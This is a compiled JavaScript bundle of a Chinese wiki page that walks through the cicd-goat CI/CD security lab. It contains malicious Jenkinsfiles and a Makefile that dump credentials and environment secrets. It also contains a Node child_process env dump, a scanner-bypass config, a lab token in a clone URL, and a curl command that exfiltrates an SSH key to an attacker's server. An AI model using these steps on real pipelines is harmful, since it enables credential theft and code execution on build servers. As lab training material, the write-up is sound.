"use strict";(self.webpackChunkwhoopsunix_wiki=self.webpackChunkwhoopsunix_wiki||[]).push([[3376],{58202:(e,i,s)=>{s.r(i),s.d(i,{assets:()=>r,contentTitle:()=>d,default:()=>o,frontMatter:()=>t,metadata:()=>a,toc:()=>l});var n=s(85893),c=s(11151);const t={sidebar_position:1,tags:["CVE","CICD"]},d="\u901a\u8fc7 cicd-goat \u9776\u573a\u5b66\u4e60Top 10 CI/CD Security Risks",a={id:"DevOpsAttack/cicd-goat/cicd-goat",title:"\u901a\u8fc7 cicd-goat \u9776\u573a\u5b66\u4e60Top 10 CI/CD Security Risks",description:"https://github.com/cider-security-research/cicd-goat",source:"@site/docs/05-DevOpsAttack/01-cicd-goat/01-cicd-goat.md",sourceDirName:"05-DevOpsAttack/01-cicd-goat",slug:"/DevOpsAttack/cicd-goat/",permalink:"/docs/DevOpsAttack/cicd-goat/",draft:!1,unlisted:!1,editUrl:"https://github.com/Whoopsunix/whoopsunix.github.io/docs/05-DevOpsAttack/01-cicd-goat/01-cicd-goat.md",tags:[{label:"CVE",permalink:"/docs/tags/cve"},{label:"CICD",permalink:"/docs/tags/cicd"}],version:"current",sidebarPosition:1,frontMatter:{sidebar_position:1,tags:["CVE","CICD"]},sidebar:"tutorialSidebar",previous:{title:"DevOps Attack",permalink:"/docs/DevOpsAttack/"},next:{title:"Jenkins Attack",permalink:"/docs/DevOpsAttack/Jenkins/"}},r={},l=[{value:"0x01 CICD-SEC-4 Poisoned Pipeline Execution (PPE)  White Rabbit(D-PPE)",id:"0x01-cicd-sec-4-poisoned-pipeline-execution-ppe--white-rabbitd-ppe",level:2},{value:"\u539f\u7406",id:"\u539f\u7406",level:2},{value:"\u6f0f\u6d1e\u590d\u73b0",id:"\u6f0f\u6d1e\u590d\u73b0",level:2},{value:"\u6076\u610f Jenkinsfile \u6587\u4ef6",id:"\u6076\u610f-jenkinsfile-\u6587\u4ef6",level:3},{value:"\u5408\u5e76\u5206\u652f",id:"\u5408\u5e76\u5206\u652f",level:3},{value:"0x02 Mad Hatter(I-PPE)",id:"0x02-mad-hatteri-ppe",level:2},{value:"0x03 CICD-SEC-6 Insufficient Credential Hygiene Duchess",id:"0x03-cicd-sec-6-insufficient-credential-hygiene-duchess",level:2},{value:"0x04 Caterpillar",id:"0x04-caterpillar",level:2},{value:"\u4e3a\u4ec0\u4e48\uff1f",id:"\u4e3a\u4ec0\u4e48",level:3},{value:"0x05 Cheshire Cat   CICD-SEC-4\u3001CICD-SEC-5",id:"0x05-cheshire-cat---cicd-sec-4cicd-sec-5",level:2},{value:"0x06 Twiddledum  CICD-SEC-3",id:"0x06-twiddledum--cicd-sec-3",level:2},{value:"0x07 Dodo  CICD-SEC-1",id:"0x07-dodo--cicd-sec-1",level:2},{value:"0x08 Hearts",id:"0x08-hearts",level:2},{value:"0x09 Dormouse",id:"0x09-dormouse",level:2},{value:"0x10 Mock Turtle",id:"0x10-mock-turtle",level:2}];function h(e){const i={a:"a",blockquote:"blockquote",code:"code",h1:"h1",h2:"h2",h3:"h3",img:"img",li:"li",p:"p",pre:"pre",strong:"strong",ul:"ul",...(0,c.a)(),...e.components};return(0,n.jsxs)(n.Fragment,{children:[(0,n.jsx)(i.h1,{id:"\u901a\u8fc7-cicd-goat-\u9776\u573a\u5b66\u4e60top-10-cicd-security-risks",children:"\u901a\u8fc7 cicd-goat \u9776\u573a\u5b66\u4e60Top 10 CI/CD Security Risks"}),"\n",(0,n.jsx)(i.p,{children:(0,n.jsx)(i.a,{href:"https://github.com/cider-security-research/cicd-goat",children:"https://github.com/cider-security-research/cicd-goat"})}),"\n",(0,n.jsxs)(i.h2,{id:"0x01-cicd-sec-4-poisoned-pipeline-execution-ppe--white-rabbitd-ppe",children:["0x01 ",(0,n.jsx)(i.a,{href:"https://www.cidersecurity.io/top-10-cicd-security-risks/poisoned-pipeline-execution-ppe/",children:"CICD-SEC-4 Poisoned Pipeline Execution (PPE)"}),"  White Rabbit(D-PPE)"]}),"\n",(0,n.jsx)(i.p,{children:"\u53ef\u4ee5\u901a\u8fc7 admin ciderland5# \u767b\u5f55\u540e\u53f0\u67e5\u770b\u5177\u4f53\u7684\u914d\u7f6e"}),"\n",(0,n.jsx)(i.h2,{id:"\u539f\u7406",children:"\u539f\u7406"}),"\n",(0,n.jsxs)(i.p,{children:["\u6f0f\u6d1e\u4ecb\u7ecd\uff1a",(0,n.jsx)(i.a,{href:"https://www.cidersecurity.io/blog/research/ppe-poisoned-pipeline-execution/?utm_source=github&utm_medium=github_page&utm_campaign=ci%2fcd%20goat_060422",children:"https://www.cidersecurity.io/blog/research/ppe-poisoned-pipeline-execution/?utm_source=github&utm_medium=github_page&utm_campaign=ci%2fcd%20goat_060422"})]}),"\n",(0,n.jsx)(i.p,{children:"\u7b80\u5355\u6765\u8bf4\u5c31\u662f\u901a\u8fc7\u4fee\u6539\u5b58\u50a8\u5e93\u4e2d\u53ef\u63a7\u7684 CI \u7ba1\u9053\u914d\u7f6e\u6587\u4ef6\u8fbe\u5230\u6267\u884c\u547d\u4ee4\u7684\u76ee\u7684\uff0cJenkinsfile\uff08Jenkins\uff09\u3001.gitlab-ci.yml\uff08GitLab\uff09\u3001.circleci/config.yml\uff08CircleCI\uff09\u3001.github/workflowers \u7684 GitHub Actions YAML \u6587\u4ef6\u8fd9\u4e9b\u90fd\u662f CI \u914d\u7f6e\u6587\u4ef6\u3002"}),"\n",(0,n.jsx)(i.p,{children:"PPE \u4e3b\u8981\u6709\u4e09\u79cd\u653b\u51fb\u65b9\u5f0f\uff1a"}),"\n",(0,n.jsxs)(i.ul,{children:["\n",(0,n.jsxs)(i.li,{children:[(0,n.jsx)(i.strong,{children:"Direct (D-PPE)"}),"\uff1a\u4fee\u6539\u53ef\u8bbf\u95ee\u7684\u5b58\u50a8\u5e93\u4e2d\u7684 CI \u914d\u7f6e\u6587\u4ef6\u540e\u76f4\u63a5\u5c06\u66f4\u6539\u63a8\u9001\u5230\u5b58\u50a8\u5e93\u4e0a\u7684\u4e00\u4e2a\u672a\u53d7\u4fdd\u62a4\u7684\u8fdc\u7a0b\u5206\u652f\uff0c\u6216\u8005\u901a\u8fc7\u4ece\u4e00\u4e2a\u5206\u652f\u6216\u5206\u53c9\u63d0\u4ea4\u5e26\u6709\u66f4\u6539\u7684 PR\u3002\u7531\u4e8e CI \u7ba1\u9053\u7684\u6267\u884c\u662f\u7531 push \u6216 PR \u4e8b\u4ef6\u89e6\u53d1\u7684\uff0c\u5e76\u4e14\u7ba1\u9053\u7684\u6267\u884c\u662f\u7531\u4fee\u6539\u540e\u7684 CI \u914d\u7f6e\u6587\u4ef6\u4e2d\u7684\u547d\u4ee4\u5b9a\u4e49\u7684\uff0c\u653b\u51fb\u8005\u7684\u6076\u610f\u547d\u4ee4\u6700\u7ec8\u5728\u6784\u5efa\u7ba1\u9053\u89e6\u53d1\u540e\u5728\u6784\u5efa\u8282\u70b9\u4e0a\u8fd0\u884c\u3002"]}),"\n",(0,n.jsxs)(i.li,{children:[(0,n.jsx)(i.strong,{children:"Indirect (I-PPE)"}),"\uff1a\u5982\u679cCI\u7684\u6d41\u6c34\u7ebf\u5b9a\u4e49\u4e0d\u662f\u5728\u4ee3\u7801\u4ed3\u5e93\u4e2d\u7684\u914d\u7f6e\u6587\u4ef6\u5b9a\u4e49\uff0c\u800c\u662f\u5728CI\u7cfb\u7edf\uff08Jenkins\uff09\u81ea\u8eab\u5b9a\u4e49\u7684\u3002\u4ecd\u7136\u53ef\u4ee5\u901a\u8fc7\u4ee3\u7801\u4ed3\u5e93\u4e2d\u5b58\u5728\u7684\u6587\u4ef6\u8fdb\u884c\u6076\u610f\u4ee3\u7801\u6267\u884c\uff0c\u5982 Makefile \u6587\u4ef6\u3001\u7ba1\u9053\u4e2d\u81ea\u5b9a\u4e49\u6267\u884c\u7684shell\u811a\u672c\u3002\u901a\u8fc7\u95f4\u63a5\u63d2\u5165\u6076\u610f\u4ee3\u7801\u5230\u7ba1\u9053\u4e2d\u6267\u884c\u7684\u811a\u672c\uff0c\u8fbe\u5230\u6076\u610f\u4ee3\u7801\u690d\u5165\u3002"]}),"\n",(0,n.jsxs)(i.li,{children:[(0,n.jsx)(i.strong,{children:"Public (P-PPE, or 3PE)"}),"\uff1a\u4ece\u516c\u5171\u7684\u4ee3\u7801\u4ed3\u5e93\u62c9\u53d6\u7684\u4ee3\u7801\uff0c\u5982\u679c\u653b\u51fb\u8005\u901a\u8fc7\u516c\u5171\u4ed3\u5e93\u8fdb\u884c\u6295\u6bd2\uff0c\u4f1a\u5bf9CI\u7cfb\u7edf\u9020\u6210\u7834\u574f\uff0c\u5982\u679cCI\u7cfb\u7edf\u5728\u5185\u7f51\uff0c\u751a\u81f3\u53ef\u80fd\u8fdb\u4e00\u6b65\u5371\u5bb3\u5185\u7f51\u5b89\u5168\u3002"]}),"\n"]}),"\n",(0,n.jsx)(i.h2,{id:"\u6f0f\u6d1e\u590d\u73b0",children:"\u6f0f\u6d1e\u590d\u73b0"}),"\n",(0,n.jsx)(i.h3,{id:"\u6076\u610f-jenkinsfile-\u6587\u4ef6",children:"\u6076\u610f Jenkinsfile \u6587\u4ef6"}),"\n",(0,n.jsxs)(i.p,{children:["\u8bbf\u95ee Gitea \u7684 ",(0,n.jsx)(i.code,{children:"Wonderland/white-rabbit"})," \u9879\u76ee\u4e0b\u6709\u4e00\u4e2a Jenkinsfile \u6587\u4ef6\uff0c\u4fee\u6539\u5982\u4e0b\uff0c\u5c06\u83b7\u53d6\u540d\u4e3a flag1 \u7684\u51ed\u636e\uff0c\u5e76\u5b58\u50a8\u5728 msg \u73af\u5883\u53d8\u91cf\u4e2d\u5e76\u8f93\u51fa"]}),"\n",(0,n.jsx)(i.pre,{children:(0,n.jsx)(i.code,{children:"pipeline {\n    agent any\n    stages {\n        stage ('poc') {\n            steps {\n                withCredentials([string(credentialsId: 'flag1', variable: 'msg')]) {\n                    sh '''\n                        echo $msg | base64\n                    '''                 \n                }\n            }\n        }\n    }\n}\n"})}),"\n",(0,n.jsxs)(i.p,{children:["\u8fd9\u91cc\u6211\u4eec\u9650\u5236\u4e86 String \u7c7b\u578b\uff0c\u6240\u4ee5\u5b9e\u9645\u51ed\u8bc1\u662f\u9700\u8981\u7b26\u5408 ",(0,n.jsx)(i.code,{children:"org.jenkinsci.plugins.plaincredentials.StringCredentials"})," \u8fd9\u4e2a\u7c7b\u578b\u7684\uff0cJenkins \u652f\u6301\u7684\u51ed\u636e\u89c1 ",(0,n.jsx)(i.a,{href:"https://www.jenkins.io/doc/book/using/using-credentials/",children:"\u5b98\u65b9"})]}),"\n",(0,n.jsx)(i.p,{children:(0,n.jsx)(i.img,{alt:"image-20240327175201062",src:s(84917).Z+"",width:"594",height:"288"})}),"\n",(0,n.jsxs)(i.p,{children:["\u4e3e\u4f8b\u8bf4\u660e\uff0c\u5728 Jenkins-server \u7684 /var/jenkins_home/credentials.xml \u6587\u4ef6\u5b58\u50a8\u7684\u51ed\u636e\u662f\u4f5c\u7528\u4e8e\u5168\u5c40\u7684\uff0c\u4e0d\u540c\u7684\u5b57\u6bb5\u5c31\u5bf9\u5e94\u7684\u662f ",(0,n.jsx)(i.code,{children:"withCredentials([string("}),"\u3001",(0,n.jsx)(i.code,{children:"withCredentials([usernamePassword("})," \u8fd9\u6837\u7684\u5b57\u6bb5"]}),"\n",(0,n.jsx)(i.p,{children:(0,n.jsx)(i.img,{alt:"image-20240327114814291",src:s(50817).Z+"",width:"947",height:"397"})}),"\n",(0,n.jsx)(i.p,{children:"\u5b9e\u9645\u53ef\u4ee5\u901a\u8fc7\u5982\u4e0b\u4ee3\u7801\u76f4\u63a5\u6307\u5b9a\u5728\u53ef\u7528\u8282\u70b9  Jenkins-agent \u6267\u884c\u547d\u4ee4"}),"\n",(0,n.jsx)(i.pre,{children:(0,n.jsx)(i.code,{children:"pipeline {\n    agent any\n    stages {\n        stage ('poc') {\n            steps {\n                sh \"touch /tmp/pwn1.txt\"\n            }\n        }\n    }\n}\n"})}),"\n",(0,n.jsxs)(i.p,{children:["\u8fd8\u53ef\u4ee5\u7528 ",(0,n.jsx)(i.code,{children:"agent {label 'built-in'}"})," \u6307\u5b9a\u5728 Master \u8282\u70b9\uff0c\u5373 Jenkins server \u6267\u884c\u547d\u4ee4"]}),"\n",(0,n.jsx)(i.pre,{children:(0,n.jsx)(i.code,{children:"pipeline {\n    agent {label 'built-in'}\n    stages {\n        stage ('poc') {\n            steps {\n                sh 'touch /tmp/pwn.txt'\n            }\n        }\n    }\n}\n"})}),"\n",(0,n.jsx)(i.p,{children:"\u8fd9\u4e24\u4e2a\u540d\u5b57\u90fd\u662f\u53ef\u4ee5\u7684"}),"\n",(0,n.jsx)(i.p,{children:(0,n.jsx)(i.img,{alt:"image-20240328094238495",src:s(37832).Z+"",width:"2078",height:"1208"})}),"\n",(0,n.jsx)(i.h3,{id:"\u5408\u5e76\u5206\u652f",children:"\u5408\u5e76\u5206\u652f"}),"\n",(0,n.jsx)(i.p,{children:"\u521b\u5efa\u65b0\u5206\u652f\u5e76\u5408\u5e76"}),"\n",(0,n.jsx)(i.pre,{children:(0,n.jsx)(i.code,{children:'git checkout -b poc\ngit add *\ngit commit -m "commit"\ngit push -u origin poc\n'})}),"\n",(0,n.jsxs)(i.p,{children:["\u4e4b\u540e\u6765\u5230 Jenkins \u7684 pipeline \u6784\u5efa\u8fc7\u7a0b\u67e5\u770b\u7ed3\u679c ",(0,n.jsx)(i.a,{href:"http://localhost:8080/view/all/builds",children:"http://localhost:8080/view/all/builds"})]}),"\n",(0,n.jsx)(i.p,{children:(0,n.jsx)(i.img,{alt:"image-20240327092817640",src:s(9975).Z+"",width:"1048",height:"339"})}),"\n",(0,n.jsx)(i.p,{children:(0,n.jsx)(i.img,{alt:"image-20240327114231425",src:s(15585).Z+"",width:"571",height:"247"})}),"\n",(0,n.jsx)(i.h2,{id:"0x02-mad-hatteri-ppe",children:"0x02 Mad Hatter(I-PPE)"}),"\n",(0,n.jsxs)(i.p,{children:["mad-hatter \u662f\u4e24\u4e2a\u5e93\uff0cpipeline \u8fd9\u4e2a\u5e93\u6ca1\u6709\u6743\u9650\u64cd\u4f5c\uff0c\u4f46\u5728 ",(0,n.jsx)(i.code,{children:"Wonderland/mad-hatter"})," \u5e93\u4e2d\u5b58\u5728 Makefile\uff0c\u662f\u4e00\u4e2a I-PPE \u5229\u7528"]}),"\n",(0,n.jsx)(i.p,{children:(0,n.jsx)(i.img,{alt:"image-20240327153214707",src:s(66964).Z+"",width:"837",height:"175"})}),"\n",(0,n.jsx)(i.pre,{children:(0,n.jsx)(i.code,{children:'abc:\n\techo "${FLAG}" | base64\n'})}),"\n",(0,n.jsxs)(i.h2,{id:"0x03-cicd-sec-6-insufficient-credential-hygiene-duchess",children:["0x03 ",(0,n.jsx)(i.a,{href:"https://www.cidersecurity.io/top-10-cicd-security-risks/insufficient-credential-hygiene/",children:"CICD-SEC-6 Insufficient Credential Hygiene"})," Duchess"]}),"\n",(0,n.jsxs)(i.p,{children:["\u6bd4\u8f83\u7b80\u5355\u7684\u4e00\u4e2a Git \u5b58\u50a8\u5e93\u83b7\u53d6\uff0c\u7528 ",(0,n.jsx)(i.a,{href:"https://github.com/gitleaks/gitleaks",children:"gitleaks"})," \u83b7\u53d6\u654f\u611f\u4fe1\u606f"]}),"\n",(0,n.jsx)(i.pre,{children:(0,n.jsx)(i.code,{children:"gitleaks detect -v\n"})}),"\n",(0,n.jsx)(i.p,{children:(0,n.jsx)(i.img,{alt:"image-20240327155320394",src:s(9427).Z+"",width:"1866",height:"324"})}),"\n",(0,n.jsxs)(i.p,{children:["\u8fd9\u91cc\u663e\u793a\u4e0d\u5168\uff0c\u901a\u8fc7 ",(0,n.jsx)(i.code,{children:"Fingerprint"})," \u7684 commit hash \u4f7f\u7528 ",(0,n.jsx)(i.code,{children:"git show <commit-hash>"})," \u83b7\u53d6\u8be5\u5386\u53f2\u8bb0\u5f55\u3002"]}),"\n",(0,n.jsx)(i.p,{children:(0,n.jsx)(i.img,{alt:"image-20240327155246213",src:s(49646).Z+"",width:"2602",height:"588"})}),"\n",(0,n.jsx)(i.h2,{id:"0x04-caterpillar",children:"0x04 Caterpillar"}),"\n",(0,n.jsxs)(i.p,{children:["\u540c\u6837\u662f\u4e00\u4e2a PPE \u7684\u9898\u76ee\uff0c\u5148 fork Wonderland/caterpillar \u4ed3\u5e93\uff0c\u4fee\u6539 Jenkinsfile \u540e\u53d1\u8d77 ",(0,n.jsx)(i.code,{children:"Pull Request"})," \u8bf7\u6c42\uff0c\u5176\u4ed6\u64cd\u4f5c\u90fd\u662f\u4e00\u6837\u7684\u4e86\uff0c\u6267\u884c ",(0,n.jsx)(i.code,{children:"env"})," \u62ff\u5230 GITEA_TOKEN\uff0c\u6267\u884c\u62c9\u53d6\u8bf7\u6c42 ",(0,n.jsx)(i.code,{children:"git clone http://5d3ed5564341d5060c8524c41fe03507e296ca46@localhost:3000/Wonderland/caterpillar.git"})]}),"\n",(0,n.jsx)(i.p,{children:(0,n.jsx)(i.img,{alt:"image-20240327171748575",src:s(89581).Z+"",width:"2184",height:"1062"})}),"\n",(0,n.jsx)(i.p,{children:"\u62ff\u5230\u6709\u6743\u9650\u7684 token \u540e\u62c9\u53d6\u4ed3\u5e93\uff0c\u4e4b\u540e\u6784\u5efa\u5229\u7528 Jenkinsfile \u83b7\u53d6 flag\u3002"}),"\n",(0,n.jsx)(i.pre,{children:(0,n.jsx)(i.code,{children:"pipeline {\n    agent any\n    stages {\n        stage ('poc') {\n          steps {\n              withCredentials([usernamePassword(credentialsId: 'flag2', usernameVariable: 'flag2', passwordVariable: 'TOKEN')]) {\n                  sh 'echo $TOKEN | base64'\n              }\n          }\n        }\n    }\n}\n"})}),"\n",(0,n.jsx)(i.h3,{id:"\u4e3a\u4ec0\u4e48",children:"\u4e3a\u4ec0\u4e48\uff1f"}),"\n",(0,n.jsx)(i.p,{children:"\u767b\u5f55 admin \u53ef\u4ee5\u770b\u5230\u8fd9\u4e2a\u9898\u6709\u4e24\u4e2a\u7ba1\u6bb5 wonderland-caterpillar-test \u901a\u8fc7 fork \u5408\u5e76\u89e6\u53d1\uff0cwonderland-caterpillar-prod \u6307 \u6ca1\u6709 PR \u7684\u5206\u652f"}),"\n",(0,n.jsx)(i.p,{children:(0,n.jsx)(i.img,{alt:"image-20240327163926504",src:s(10354).Z+"",width:"1510",height:"530"})}),"\n",(0,n.jsx)(i.p,{children:(0,n.jsx)(i.img,{alt:"image-20240327173956456",src:s(52049).Z+"",width:"2148",height:"1060"})}),"\n",(0,n.jsx)(i.h2,{id:"0x05-cheshire-cat---cicd-sec-4cicd-sec-5",children:"0x05 Cheshire Cat   CICD-SEC-4\u3001CICD-SEC-5"}),"\n",(0,n.jsx)(i.p,{children:"\u7528\u524d\u9762\u4ecb\u7ecd\u8fc7\u7684\u6307\u5b9a\u8282\u70b9\u6267\u884c\u547d\u4ee4"}),"\n",(0,n.jsx)(i.pre,{children:(0,n.jsx)(i.code,{children:"pipeline {\n    agent {label 'built-in'}\n    stages {\n        stage ('poc') {\n            steps {\n                sh 'touch /tmp/pwn.txt'\n            }\n        }\n    }\n}\n"})}),"\n",(0,n.jsx)(i.h2,{id:"0x06-twiddledum--cicd-sec-3",children:"0x06 Twiddledum  CICD-SEC-3"}),"\n",(0,n.jsx)(i.p,{children:"twiddledum \u662f\u6839\u636e twiddledee \u7684 tag \u53d8\u52a8\u6765\u6267\u884c\u7684\uff0c\u4fee\u6539 twiddledee \u7684 index.js \u4e3a"}),"\n",(0,n.jsx)(i.pre,{children:(0,n.jsx)(i.code,{children:"const child_process = require('child_process');\nchild_process.exec('env|base64 -w 0',function(error, stdout, stderr){console.log(stdout)});\n"})}),"\n",(0,n.jsx)(i.p,{children:"\u63d0\u4ea4\u540e\u624b\u52a8 build"}),"\n",(0,n.jsx)(i.pre,{children:(0,n.jsx)(i.code,{children:"git tag 1.2.0 HEAD\ngit push origin 1.2.0\n"})}),"\n",(0,n.jsx)(i.h2,{id:"0x07-dodo--cicd-sec-1",children:"0x07 Dodo  CICD-SEC-1"}),"\n",(0,n.jsxs)(i.p,{children:["\u5f15\u5165 ",(0,n.jsx)(i.a,{href:"https://github.com/bridgecrewio/checkov",children:"checkov"})," \u4ea7\u751f\u7684\u5b89\u5168\u95ee\u9898\uff0c\u8fd9\u4e2a\u5de5\u5177\u4f1a\u8bfb\u53d6\u4ed3\u5e93\u4e2d\u7684 .checkov.yml \u914d\u7f6e\u6587\u4ef6\u4f5c\u4e3a checkov \u8fd0\u884c\u7684\u914d\u7f6e\uff0c\u5177\u4f53\u539f\u7406\u53c2\u8003 ",(0,n.jsx)(i.a,{href:"https://www.cidersecurity.io/blog/research/malicious-code-analysis-abusing-sast-misconfigurations-to-hack-ci-systems/",children:"\u8fd9\u7bc7\u6587\u7ae0"})," \u3002"]}),"\n",(0,n.jsx)(i.p,{children:"\u590d\u73b0\u4fee\u6539 main.tf \u7684 ACL \u4e3a public-read"}),"\n",(0,n.jsx)(i.p,{children:(0,n.jsx)(i.img,{alt:"image-20240328114422749",src:s(12467).Z+"",width:"754",height:"200"})}),"\n",(0,n.jsx)(i.p,{children:"\u521b\u5efa .checkov.yml \u6587\u4ef6"}),"\n",(0,n.jsx)(i.pre,{children:(0,n.jsx)(i.code,{children:"soft-fail: true\ncheck:\n  - THIS_NOT_THE_CHECK_YOUR_ARE_LOOKING_FOR\n"})}),"\n",(0,n.jsx)(i.p,{children:"push"}),"\n",(0,n.jsx)(i.pre,{children:(0,n.jsx)(i.code,{children:'git add .checkov.yml\ngit commit -m "add"\ngit push\n'})}),"\n",(0,n.jsx)(i.p,{children:"\u9700\u8981\u6ce8\u610f\u7684\u662f \u5982\u679c\u662f\u672c\u5730\u62c9\u53d6\u540e\u518d commit \u7684\u4f1a\u5728 jenkins \u670d\u52a1\u5668\u4e0a\u521b\u5efa\u8d26\u53f7\uff0c\u8fd9\u4e2a\u8d26\u53f7\u548c git \u63d0\u4ea4\u65f6\u7684\u53f7\u6709\u5173\uff0c\u521b\u5efa\u540e\u5c31\u9700\u8981 admin \u8d26\u53f7\u624d\u80fd\u5220\u9664\uff0c\u662f\u4e2a\u5929\u5751"}),"\n",(0,n.jsx)(i.p,{children:(0,n.jsx)(i.img,{alt:"image-20240328141601962",src:s(8961).Z+"",width:"1752",height:"110"})}),"\n",(0,n.jsx)(i.h2,{id:"0x08-hearts",children:"0x08 Hearts"}),"\n",(0,n.jsx)(i.p,{children:"\u65b0\u5efa Node \u901a\u8fc7 SSH \u8fde\u63a5\u83b7\u53d6 prod ssh \u5bc6\u94a5"}),"\n",(0,n.jsxs)(i.p,{children:["\u4f7f\u7528 ",(0,n.jsx)(i.a,{href:"https://github.com/cowrie/cowrie",children:"cowrie"})," \u871c\u7f50"]}),"\n",(0,n.jsx)(i.pre,{children:(0,n.jsx)(i.code,{children:"docker run -p 2222:2222 cowrie/cowrie\n"})}),"\n",(0,n.jsx)(i.p,{children:"\u65b0\u5efa\u540e\u9009\u62e9\u9700\u8981\u83b7\u53d6\u7684\u51ed\u8bc1\u8282\u70b9\u53ca\u871c\u7f50\u76d1\u542c ip"}),"\n",(0,n.jsx)(i.p,{children:(0,n.jsx)(i.img,{alt:"image-20240328145637049",src:s(34838).Z+"",width:"2116",height:"934"})}),"\n",(0,n.jsx)(i.p,{children:"\u76d1\u542c\u5f97\u5230 Prod \u7684 ssh \u5bc6\u7801"}),"\n",(0,n.jsx)(i.p,{children:(0,n.jsx)(i.img,{alt:"image-20240328141146680",src:s(1614).Z+"",width:"855",height:"102"})}),"\n",(0,n.jsx)(i.h2,{id:"0x09-dormouse",children:"0x09 Dormouse"}),"\n",(0,n.jsx)(i.p,{children:"Wonderland/dormouse \u4ed3\u5e93\u7684 Jenkinsfile \u6587\u4ef6\u5b58\u5728\u4e00\u4e2a\u4e0b\u8f7d .sh \u6587\u4ef6\u7684\u5730\u5740"}),"\n",(0,n.jsx)(i.p,{children:(0,n.jsx)(i.img,{alt:"image-20240328161730165",src:s(58505).Z+"",width:"1978",height:"450"})}),"\n",(0,n.jsxs)(i.p,{children:["\u8fdb\u5165 ",(0,n.jsx)(i.a,{href:"http://localhost:3000/Cov/reportcov",children:"http://localhost:3000/Cov/reportcov"})," \u4ed3\u5e93\uff0cJenkinsfile \u6587\u4ef6\u76f4\u63a5\u62fc\u63a5 title \u6267\u884c\u547d\u4ee4\uff0c\u5b58\u5728\u4ee3\u7801\u6ce8\u5165"]}),"\n",(0,n.jsx)(i.p,{children:(0,n.jsx)(i.img,{alt:"image-20240328161956710",src:s(90040).Z+"",width:"2020",height:"826"})}),"\n",(0,n.jsx)(i.p,{children:"\u901a\u8fc7\u73af\u5883\u53d8\u91cf KEY \u5411\u8fdc\u7a0b\u4e3b\u673a\u590d\u5236\u6587\u4ef6\uff0cssh \u5bc6\u94a5\uff0c\u6240\u4ee5\u53ef\u4ee5\u83b7\u53d6\u8be5\u53d8\u91cf"}),"\n",(0,n.jsx)(i.pre,{children:(0,n.jsx)(i.code,{children:'`echo "${KEY}" > key && curl -v -F file=@key <YOUR SERVER>`\n'})}),"\n",(0,n.jsx)(i.p,{children:(0,n.jsx)(i.img,{alt:"image-20240328162059538",src:s(9238).Z+"",width:"1484",height:"222"})}),"\n",(0,n.jsx)(i.h2,{id:"0x10-mock-turtle",children:"0x10 Mock Turtle"}),"\n",(0,n.jsx)(i.p,{children:"\u89e3\u8bfb Jenkinsfile \u6587\u4ef6\u7684\u4e09\u4e2a check \uff0c\u6309\u8981\u6c42\u6784\u9020\u540e\u521b\u5efa\u65b0\u5206\u652f\u540e\u53d1\u8d77 PR"}),"\n",(0,n.jsx)(i.p,{children:(0,n.jsx)(i.img,{alt:"image-20240328173112276",src:s(78331).Z+"",width:"2232",height:"1456"})}),"\n",(0,n.jsx)(i.p,{children:"\u5177\u4f53 check \u89e3\u8bfb\u89c1 chatgpt"}),"\n",(0,n.jsx)(i.p,{children:(0,n.jsx)(i.img,{alt:"image-20240328173425683",src:s(27359).Z+"",width:"800",height:"1020"})}),"\n",(0,n.jsx)(i.p,{children:(0,n.jsx)(i.strong,{children:"\u53c2\u8003"})}),"\n",(0,n.jsxs)(i.blockquote,{children:["\n",(0,n.jsx)(i.p,{children:(0,n.jsx)(i.a,{href:"https://xz.aliyun.com/t/13009",children:"https://xz.aliyun.com/t/13009"})}),"\n",(0,n.jsx)(i.p,{children:(0,n.jsx)(i.a,{href:"https://tttang.com/archive/1650/",children:"https://tttang.com/archive/1650/"})}),"\n"]})]})}function o(e={}){const{wrapper:i}={...(0,c.a)(),...e.components};return i?(0,n.jsx)(i,{...e,children:(0,n.jsx)(h,{...e})}):h(e)}},9975:(e,i,s)=>{s.d(i,{Z:()=>n});const n=s.p+"assets/images/image-20240327092817640-e050ebf9c70726f01f3f1651ae9b1d6a.png"},15585:(e,i,s)=>{s.d(i,{Z:()=>n});const n=s.p+"assets/images/image-20240327114231425-b352ac5a5314fd3b8c5fa3f5bbc4c719.png"},50817:(e,i,s)=>{s.d(i,{Z:()=>n});const n=s.p+"assets/images/image-20240327114814291-206fd4c19c64aa96dbf69483aed8ccdf.png"},66964:(e,i,s)=>{s.d(i,{Z:()=>n});const n=s.p+"assets/images/image-20240327153214707-5a24b65ff59cd9f60a962a9e0c41c4f6.png"},49646:(e,i,s)=>{s.d(i,{Z:()=>n});const n=s.p+"assets/images/image-20240327155246213-804fa602d964b39562e7ec865d996d7a.png"},9427:(e,i,s)=>{s.d(i,{Z:()=>n});const n=s.p+"assets/images/image-20240327155320394-268f1e0a3e31e445bd12b864613675ba.png"},10354:(e,i,s)=>{s.d(i,{Z:()=>n});const n=s.p+"assets/images/image-20240327163926504-06f76e7827da90f1db10b44ca9ca40c0.png"},89581:(e,i,s)=>{s.d(i,{Z:()=>n});const n=s.p+"assets/images/image-20240327171748575-71239e1ed678a76fa883097366d423be.png"},52049:(e,i,s)=>{s.d(i,{Z:()=>n});const n=s.p+"assets/images/image-20240327173956456-da90afcebc29a4aea728d4114f2fff5c.png"},84917:(e,i,s)=>{s.d(i,{Z:()=>n});const n=s.p+"assets/images/image-20240327175201062-f5776c7b9bab8e7fa049bea40be4fd2e.png"},37832:(e,i,s)=>{s.d(i,{Z:()=>n});const n=s.p+"assets/images/image-20240328094238495-68d41c7f5f3167dff29cf3d88f5a88b7.png"},12467:(e,i,s)=>{s.d(i,{Z:()=>n});const n=s.p+"assets/images/image-20240328114422749-6dc686583ccbf6b1d0e3383f6bddcbcc.png"},1614:(e,i,s)=>{s.d(i,{Z:()=>n});const n=s.p+"assets/images/image-20240328141146680-0ae4062a2a1b9e3cd61977987aa03d81.png"},8961:(e,i,s)=>{s.d(i,{Z:()=>n});const n=s.p+"assets/images/image-20240328141601962-5e9373658e6379072895f1228be51fd2.png"},34838:(e,i,s)=>{s.d(i,{Z:()=>n});const n=s.p+"assets/images/image-20240328145637049-1ac796483508d8a9da834a19d4d95b10.png"},58505:(e,i,s)=>{s.d(i,{Z:()=>n});const n=s.p+"assets/images/image-20240328161730165-0f2a490602d04bb890468ef8545e15e8.png"},90040:(e,i,s)=>{s.d(i,{Z:()=>n});const n=s.p+"assets/images/image-20240328161956710-70cf32b3f2859c314b483f902ae4229f.png"},9238:(e,i,s)=>{s.d(i,{Z:()=>n});const n=s.p+"assets/images/image-20240328162059538-2373143951ad7c723686341c44f535b7.png"},78331:(e,i,s)=>{s.d(i,{Z:()=>n});const n=s.p+"assets/images/image-20240328173112276-28ecc2840afbf739ef450d523ebac5bd.png"},27359:(e,i,s)=>{s.d(i,{Z:()=>n});const 